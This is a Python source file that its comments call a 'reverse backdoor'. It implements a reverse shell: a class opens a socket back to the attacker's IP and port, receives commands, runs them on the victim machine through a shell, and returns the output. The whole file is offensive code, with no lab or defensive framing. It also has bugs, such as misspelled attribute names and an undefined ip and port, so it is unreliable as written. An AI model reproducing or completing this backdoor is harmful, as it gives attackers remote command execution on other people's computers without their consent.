# coding reverse backdoor in python 
# the main function is to let the user try to connect to us instead to we trying to coonnect to user

# ------------------------------- start of code -----------------------------

import sys
import json
import socket
import subprocess

class Suspicious:
  def __init__(self, ip, port):
    self.connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.connection.connect((ip, port))
    self.connetion.send("[+] Connection Success.\n".encode('utf-8'))
  
  def execute_system_commands(self, command):
    # the output data type of the check_output method is byte
    return subprocess.check_output(command, shell=True).decode('utf-8')
  
  def receive_data(self):
    json_data = ""
    while True:
      try:
        json_data += self.connetion.recv(1024).decode('utf-8')
        return json.loads(json_data)
      except ValueError:
        continue
  
  def send_data(self, data):
    json_data = json.dumps(data)
    self.connetion.send(json_data.encode('utf-8'))
  
  def start(self):
    while True:
      try:
        data_received = self.connetion.recv(1024).decode('utf-8')
        command_result = self.execute_system_commands(data_received)
        self.connetion.send(command_result)
      except subprocess.CalledProcessError as error:
        self.connetion.send(error)
        sys.exit()
      except KeyboardInterrupt as error:
        data = "\r[+] Keyboard Interrpution, quitting the program\n"
        self.connetion.send(data.encode('utf-8'))
        sys.exit()
    self.connetion.close()

# these ip and port values are of hackers system values
backdoor = Suspicious(ip, port)
backdoor.start()